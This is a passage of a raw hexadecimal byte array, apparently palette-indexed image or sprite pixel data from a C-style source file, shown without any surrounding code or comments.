0x12, 0x12, 0x14, 0x9C, 0x9B, 0x9B, 0x18, 0x07, 0x07, 0x08, 0x08, 0x18, 0x1B, 0x1C, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x08, 0x08, 0x08,
0x14, 0x14, 0xE3, 0xE1, 0xC9, 0xC9, 0xE1, 0xE2, 0xE2, 0xF6, 0xF6, 0xF7, 0xDE, 0xDF, 0xDE, 0xF5,
0x97, 0xDE, 0xC6, 0xDE, 0x97, 0x96, 0xAF, 0xAE, 0xAE, 0xAF, 0x96, 0x97, 0xF4, 0xDD, 0xDD, 0xDE,
0xDF, 0xC8, 0xC6, 0xC6, 0xC6, 0xC6, 0xC5, 0x96, 0x19, 0x4F, 0x4E, 0x4E, 0x4E, 0x4E, 0x4E, 0x4E,
0x4E, 0x4E, 0x4E, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1B, 0x18, 0x17, 0x9B, 0x9A, 0x9A, 0x99, 0x99, 0x99, 0x98, 0x99, 0x99,
0x98, 0x98, 0x08, 0x14, 0x14, 0x14, 0xE3, 0xE1, 0xE0, 0xC9, 0xC8, 0xC8, 0xC8, 0xDF, 0xE0, 0xE1,
0xE1, 0xE0, 0xF5, 0xE2, 0xE0, 0xE0, 0xF7, 0xF6, 0xF6, 0xF7, 0xF6, 0xF6, 0xF6, 0xDF, 0xE0, 0xE0,
0xF6, 0xF7, 0xF7, 0xE0, 0xE1, 0xE2, 0x80, 0x80, 0x80, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81,
0x81, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0xAE, 0xAE, 0x16,
0x16, 0x16, 0xAE, 0xAE, 0x99, 0xAF, 0xAF, 0xAF, 0xAF, 0x98, 0x98, 0x98, 0x98, 0x98, 0x81, 0x81,
0x81, 0x81, 0x98, 0x98, 0x98, 0x98, 0x98, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0x99, 0x98,
0x98, 0x98, 0x98, 0x98, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x14, 0x14, 0x14, 0x08, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x13, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCE, 0xE5, 0xE4, 0x08,
0x9B, 0x18, 0x19, 0x07, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x19, 0x99, 0x18, 0x1B, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1B, 0x07, 0x19, 0x19, 0x18, 0x17, 0x17, 0x17, 0x9A, 0x98, 0x80, 0xF6, 0xDF, 0xDF, 0xF7, 0x80,
0x97, 0x97, 0x97, 0xDE, 0xC8, 0xC8, 0xDE, 0x97, 0x96, 0xAF, 0xAF, 0xAF, 0xAF, 0x96, 0x96, 0x97,
0xDE, 0xC6, 0xC6, 0xC6, 0xDE, 0x96, 0xAC, 0x19, 0x4F, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0xAC, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x53, 0x1D, 0x52, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1C, 0x07, 0x19, 0x18, 0x17, 0x16, 0x9A, 0x9A, 0x99,
0x98, 0x14, 0x14, 0x14, 0xE3, 0xE2, 0xE1, 0xE0, 0xC9, 0xC9, 0xC9, 0xC8, 0xC8, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0xC8, 0xE0, 0xF6, 0x14, 0x14, 0x14, 0x98, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0xAE, 0xAE, 0xAE, 0xAE, 0x99, 0x99, 0xAE, 0xAE, 0xAE,
0xAE, 0xAE, 0x99, 0xAF, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x81, 0x97, 0x97, 0x97, 0x81, 0x81,
0x81, 0x81, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99, 0x99, 0x99, 0x98, 0x98, 0x98, 0x98, 0x98, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xE2, 0xE1, 0xE0, 0xC9, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xE8, 0xE6, 0xE5, 0x14, 0x08, 0x9E, 0x17, 0x18, 0x07,
0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1C, 0x9A, 0x9B, 0x1B, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1B, 0x07, 0x18, 0x17, 0x16, 0xAF,
0x81, 0x97, 0x97, 0x98, 0x97, 0xE0, 0xC8, 0x11, 0xC8, 0xDF, 0xDE, 0xDE, 0xDE, 0xDE, 0xDF, 0xC6,
0xC6, 0xDF, 0x97, 0xAD, 0x18, 0x18, 0x18, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0xAD, 0xAE, 0x96,
0xF5, 0xDF, 0xC6, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1B, 0x07, 0x18, 0x9B, 0x08, 0x14, 0x14, 0x14, 0xE3, 0xE3, 0xE2, 0xE1, 0xE1, 0xE1, 0xE0, 0xE0,
0xE0, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0x12,
0xC9, 0xE0, 0xE1, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x81,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x98, 0x98, 0x99, 0x99, 0x9A, 0x9A, 0x99, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x99, 0x99, 0x98,
0x08, 0x08, 0x99, 0x9A, 0x9A, 0x99, 0x08, 0x08, 0xE3, 0xE2, 0xCA, 0xC9, 0x12, 0x12, 0x12, 0x12,
0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0x12, 0xCF, 0xE8, 0xCE, 0x13, 0xE6, 0xE5, 0xE5, 0xE5,
0xE5, 0xE5, 0x14, 0x14, 0x08, 0x9E, 0x9C, 0x17, 0x17, 0x17, 0x18, 0x19, 0x07, 0x1B, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x07, 0x18, 0x1B, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1D, 0x1D,
0x1D, 0x1C, 0x07, 0x18, 0x17, 0x99, 0x14, 0xE1, 0xC8, 0x11, 0x11, 0x11, 0xC7, 0xC7, 0xC6, 0xF5,
0xAE, 0xAC, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0x94, 0x95, 0x95, 0x95, 0x96, 0xF4, 0xDF, 0x12,
0x11, 0x11, 0x11, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x07, 0x18, 0x17, 0x9A, 0x98, 0x08, 0x14, 0x14, 0x14, 0xE3, 0xE2, 0xE2,
0xE2, 0xE1, 0xE2, 0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x14,
0x14, 0xE3, 0xE2, 0xE1, 0xE1, 0xE0, 0xE1, 0xE1, 0xE2, 0xE2, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x98, 0x99, 0x9A, 0x16, 0x9B, 0x9B, 0x9A, 0x9A, 0x9B, 0x9B, 0x9B, 0x9A, 0x9B, 0x9B, 0x9B, 0x16,
0x17, 0x17, 0x17, 0x16, 0x9B, 0x16, 0x17, 0x9B, 0x08, 0xE4, 0xE3, 0x13, 0x12, 0x12, 0x12, 0xCF,
0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xE8, 0xE7, 0xE6, 0xE6, 0xE5, 0xE4, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x9E,
0x9E, 0x9D, 0x17, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x07, 0x17, 0x14, 0xE1, 0xE1, 0x80, 0xF6, 0x97, 0xAD, 0xAC,
0xAD, 0xAD, 0xAD, 0x95, 0x95, 0x95, 0x95, 0x95, 0x96, 0x96, 0x96, 0xDD, 0xC6, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1B, 0x07, 0x18, 0x18, 0x17, 0x9B, 0x9A, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0x14, 0x14, 0xE3, 0xE1, 0xE0, 0xE1, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3, 0xE3, 0x14,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x99, 0x9A, 0x9B, 0x17, 0x9B, 0x9B, 0x9B, 0x9B, 0x9C, 0x17, 0x17, 0x9B, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9B, 0x9B, 0x17, 0x17, 0x17, 0x9B, 0x08, 0xE3, 0xE2, 0xE3, 0xE2, 0xE2, 0xE3, 0xE3,
0xE5, 0xE5, 0xE5, 0xE5, 0xE4, 0xE5, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08,
0x08, 0x9F, 0x08, 0x9E, 0x16, 0x16, 0x9D, 0x9D, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x19, 0x19,
0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x07, 0x19, 0x07,
0x07, 0x1B, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x07, 0x16, 0x98, 0x98, 0xAE, 0xAE, 0xAE,
0x95, 0x95, 0x96, 0x96, 0x96, 0x96, 0x96, 0x97, 0x97, 0xDD, 0xC6, 0xC6, 0xC7, 0x11, 0x11, 0x11,
0xC8, 0xDF, 0xC8, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x07,
0x19, 0x18, 0x18, 0x19, 0x07, 0x19, 0x18, 0x18, 0x17, 0x9D, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x14, 0x14,
0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x99, 0x9A, 0x9A, 0x9B, 0x9B, 0x9B, 0x17, 0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x9B, 0x9B, 0x9B, 0x17, 0x17, 0x17, 0x17, 0x16, 0x08, 0x14, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE4,
0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x9E, 0x9E,
0x9D, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x07, 0x19,
0x18, 0x18, 0x18, 0x19, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x07, 0x17, 0xAE, 0xAE, 0xAD,
0xAD, 0xAD, 0xAC, 0xAC, 0x94, 0x95, 0x95, 0xAD, 0x95, 0x96, 0x97, 0x97, 0xDC, 0xDD, 0xDD, 0xDD,
0xF6, 0xDE, 0xDF, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x19, 0x07, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x19, 0x9D, 0xE4, 0xE4, 0x86, 0x86, 0x86, 0x86,
0x86, 0x9E, 0x9E, 0x9E, 0x9A, 0x9E, 0x9B, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x08, 0x99,
0x99, 0x9A, 0x16, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C,
0x9B, 0x9B, 0x9B, 0x9A, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x08, 0x08, 0x08, 0x14, 0xE6, 0xE6, 0xE5, 0x08, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x17, 0x17,
0x17, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x67, 0x18, 0x96, 0x97,
0x96, 0x96, 0x96, 0x96, 0x96, 0x96, 0x96, 0x95, 0x95, 0x95, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD,
0xAD, 0xAD, 0xAD, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x19, 0x17, 0x86, 0xCD, 0xE5, 0xE4, 0xE5, 0xCD, 0xCD, 0xE4,
0x9F, 0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x16, 0x16, 0x9A, 0x9E, 0x16, 0x9A, 0x9A,
0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x99, 0x99,
0x9A, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x9B, 0x9A, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9D, 0x9D, 0x9C, 0x9D, 0x9D, 0x9E, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1D, 0x1D, 0x07, 0xAE,
0xF5, 0xDD, 0xDD, 0xDD, 0xDD, 0x7E, 0x7E, 0x7E, 0x7E, 0x80, 0x80, 0x97, 0x97, 0x96, 0x96, 0x97,
0x97, 0x97, 0x97, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
